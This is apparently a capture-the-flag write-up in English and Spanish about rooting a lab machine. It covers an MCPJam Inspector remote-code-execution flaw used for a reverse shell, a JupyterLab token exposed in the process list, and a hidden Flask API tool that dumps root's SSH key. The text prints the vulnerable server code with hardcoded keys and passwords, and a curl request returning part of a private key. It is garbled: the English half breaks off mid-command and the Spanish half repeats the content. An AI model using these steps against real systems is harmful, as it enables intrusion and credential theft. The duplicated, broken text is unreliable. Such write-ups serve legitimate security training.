Exploitation Summary

Exploitation process: The target machine exposed three main services: SSH on port 22, an nginx web server on port 80 redirecting to devhub.htb, and an MCPJam Inspector instance on port 6274. The web application on port 80 provided information about the internal services running on the machine, including a reference to the MCPJam Inspector tool and an analytics environment.

The MCPJam Inspector was running version v1.4.2, which is vulnerable to a known CVE that allows unauthenticated remote code execution through the /api/mcp/connect endpoint. By crafting a malicious JSON payload that specified busybox nc as the command to execute, I obtained a reverse shell as the mcp-dev user.

From that foothold, I discovered an internal JupyterLab instance running on port 8888. The authentication token for this service was exposed in the process list, visible to any user on the system. After port-forwarding this service via chisel, I authenticated with the leaked token and spawned a terminal as the analyst user, obtaining the user flag.

For privilege escalation, I analysed a Python API server (server.py) running as root on port 5000. The source code revealed hidden tools not listed in the public API, including ops._admin_dump, which could dump root's private SSH key. Using an API key found in the analyst user's home directory, I called this hidden endpoint to retrieve root's SSH private key and gained full root access.

Technologies/Exploits: MCPJam Inspector CVE RCE (v1.4.2), JupyterLab token exposure via process list, Flask API analysis revealing hidden endpoints and credential/key dumping.

Analysing server.py

The source code of the API server reveals the full picture. Below is the relevant content (I've removed the implementations of the non-critical visible tools for brevity — they were ops.system_status, ops.list_services, ops.check_disk, and ops.view_logs):

#!/usr/bin/env python3
"""
OPSMCP - Operations MCP Server
Internal tool for system operations management
"""
from flask import Flask, jsonify, request
import os

app = Flask(__name__)

# API Key for authentication
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

# Registered tools (visible)
VISIBLE_TOOLS = {
    "ops.system_status": {
        "description": "Get system status and health metrics",
        "parameters": {}
    },
    "ops.list_services": {
        "description": "List running services",
        "parameters": {}
    },
    "ops.check_disk": {
        "description": "Check disk usage",
        "parameters": {}
    },
    "ops.view_logs": {
        "description": "View recent system logs",
        "parameters": {"service": "string"}
    }
}

# Hidden tools (not in /tools/list but callable)
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {
        "description": "Enable debug mode",
        "parameters": {}
    }
}

ALL_TOOLS = {**VISIBLE_TOOLS, **HIDDEN_TOOLS}

def check_auth():
    """Check API key authentication"""
    api_key = request.headers.get('X-API-Key', '')
    return api_key == VALID_API_KEY

@app.route('/')
def index():
    return jsonify({
        "server": "OPSMCP",
        "version": "2.1.0",
        "status": "operational",
        "endpoints": ["/tools/list", "/tools/call", "/health"],
        "auth": "Required - X-API-Key header"
    })

@app.route('/tools/call', methods=['POST'])
def call_tool():
    if not check_auth():
        return jsonify({"error": "Unauthorized"}), 401

    data = request.get_json() or {}
    tool_name = data.get('name', '')
    args = data.get('arguments', {})

    if tool_name == "ops._admin_dump":
        target = args.get('target', '')
        confirm = args.get('confirm', False)
        if not confirm:
            return jsonify({
                "error": "Confirmation required",
                "usage": "Set confirm=true to proceed",
                "warning": "This dumps sensitive credentials"
            })
        if target == "ssh_keys":
            try:
                with open('/root/.ssh/id_rsa', 'r') as f:
                    key_data = f.read()
                return jsonify({
                    "target": "ssh_keys",
                    "root_private_key": key_data,
                    "note": "Emergency recovery key dump"
                })
            except Exception as e:
                return jsonify({"error": f"Could not read key: {str(e)}"})
        elif target == "passwords":
            return jsonify({
                "target": "passwords",
                "dump": {
                    "root": "$6$rounds=656000$saltsalt$hashedpassword",
                    "analyst": "JupyterN0tebook!2026",
                    "mcp-dev": "Mcp!Insp3ct0r2026"
                }
            })
        elif target == "tokens":
            return jsonify({
                "target": "tokens",
                "api_tokens": {
                    "admin_token": "opsmcp_admin_7f3b9c2d1e4f5a6b",
                    "service_token": "opsmcp_svc_8c9d0e1f2a3b4c5d"
                }
            })
        else:
            return jsonify({
                "error": "Invalid target",
                "valid_targets": ["ssh_keys", "passwords", "tokens"]
            })

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False)

The key takeaways from this code are:

  • The API key is hardcoded as VALID_API_KEY — which matches the one found in .opsmcp_key
  • There are hidden tools defined in HIDDEN_TOOLS that are not returned by the /tools/list endpoint, but are still callable via /tools/call
  • The ops._admin_dump tool can dump SSH keys, passwords, and tokens. Since the server runs as root, it has access to /root/.ssh/id_rsa

The passwords and tokens returned by the passwords and tokens targets are not functional (the root password is a dummy hash, and the tokens don't grant additional access). However, the ssh_keys target reads the actual root private key from disk.

I call the hidden ops._admin_dump tool with target: ssh_keys and confirm: true:

  -H "Content-Type: application/json" \

Resumen de Explotación

Proceso de explotación: La máquina objetivo exponía tres servicios principales: SSH en el puerto 22, un servidor web nginx en el puerto 80 que redirigía a devhub.htb, y una instancia de MCPJam Inspector en el puerto 6274. La aplicación web del puerto 80 proporcionaba información sobre los servicios internos que se ejecutaban en la máquina, incluyendo una referencia al MCPJam Inspector y un entorno de analítica.

El MCPJam Inspector ejecutaba la versión v1.4.2, que es vulnerable a un CVE conocido que permite la ejecución remota de código sin autenticación a través del endpoint /api/mcp/connect. Elaborando un payload JSON malicioso que especificaba busybox nc como comando a ejecutar, obtuve una reverse shell como el usuario mcp-dev.

Desde ese punto de apoyo, descubrí una instancia interna de JupyterLab ejecutándose en el puerto 8888. El token de autenticación de este servicio estaba expuesto en la lista de procesos, visible para cualquier usuario del sistema. Tras hacer port-forwarding de este servicio mediante chisel, me autentiqué con el token filtrado y abrí un terminal como el usuario analyst, obteniendo la flag de usuario.

Para la escalada de privilegios, analicé un servidor API en Python (server.py) que se ejecutaba como root en el puerto 5000. El código fuente revelaba herramientas ocultas no listadas en la API pública, incluyendo ops._admin_dump, que podía volcar la clave SSH privada de root. Usando una API key encontrada en el directorio home del usuario analyst, llamé a este endpoint oculto para obtener la clave SSH privada de root y ganar acceso completo.

Tecnologías/Exploits: MCPJam Inspector CVE RCE (v1.4.2), exposición del token de JupyterLab mediante la lista de procesos, análisis de API Flask revelando endpoints ocultos y volcado de credenciales/claves.

@app.route('/tools/call', methods=['POST'])
def call_tool():
    if not check_auth():
        return jsonify({"error": "Unauthorized"}), 401

    data = request.get_json() or {}
    tool_name = data.get('name', '')
    args = data.get('arguments', {})

    if tool_name == "ops._admin_dump":
        target = args.get('target', '')
        confirm = args.get('confirm', False)
        if not confirm:
            return jsonify({
                "error": "Confirmation required",
                "usage": "Set confirm=true to proceed",
                "warning": "This dumps sensitive credentials"
            })
        if target == "ssh_keys":
            try:
                with open('/root/.ssh/id_rsa', 'r') as f:
                    key_data = f.read()
                return jsonify({
                    "target": "ssh_keys",
                    "root_private_key": key_data,
                    "note": "Emergency recovery key dump"
                })
            except Exception as e:
                return jsonify({"error": f"Could not read key: {str(e)}"})
        elif target == "passwords":
            return jsonify({
                "target": "passwords",
                "dump": {
                    "root": "$6$rounds=656000$saltsalt$hashedpassword",
                    "analyst": "JupyterN0tebook!2026",
                    "mcp-dev": "Mcp!Insp3ct0r2026"
                }
            })
        elif target == "tokens":
            return jsonify({
                "target": "tokens",
                "api_tokens": {
                    "admin_token": "opsmcp_admin_7f3b9c2d1e4f5a6b",
                    "service_token": "opsmcp_svc_8c9d0e1f2a3b4c5d"
                }
            })
        else:
            return jsonify({
                "error": "Invalid target",
                "valid_targets": ["ssh_keys", "passwords", "tokens"]
            })

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False)

Los puntos clave de este código son:

  • La API key está hardcodeada como VALID_API_KEY — coincide con la encontrada en .opsmcp_key
  • Hay herramientas ocultas definidas en HIDDEN_TOOLS que no se devuelven por el endpoint /tools/list, pero que sí son invocables a través de /tools/call
  • La herramienta ops._admin_dump puede volcar claves SSH, contraseñas y tokens. Como el servidor se ejecuta como root, tiene acceso a /root/.ssh/id_rsa

Las contraseñas y tokens devueltos por los targets passwords y tokens no son funcionales (la contraseña de root es un hash falso, y los tokens no otorgan acceso adicional). Sin embargo, el target ssh_keys lee la clave privada real de root del disco.

Volcando la Clave SSH de Root

Llamo a la herramienta oculta ops._admin_dump con target: ssh_keys y confirm: true:

curl -X POST localhost:5000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{"name": "ops._admin_dump", "arguments": {"confirm": true, "target": "ssh_keys"}}'
{"note":"Emergency recovery key dump","root_private_key":"-----BEGIN OPENSSH PRIVATE KEY-----\nb3Blbn(...)"}

La API devuelve la clave privada SSH de root. La clave contiene saltos de línea escapados (\n), así que la normalizo con sed:

└─$ echo "-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
(...)
JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK\nlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=
\n-----END OPENSSH PRIVATE KEY-----\n" | sed 's/\\n/\n/g'

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
(...)

Guardo esta clave en un archivo, establezco los permisos correctos y me conecto por SSH como root:

chmod 600 root_id_rsa
ssh -i root_id_rsa root@devhub.htb
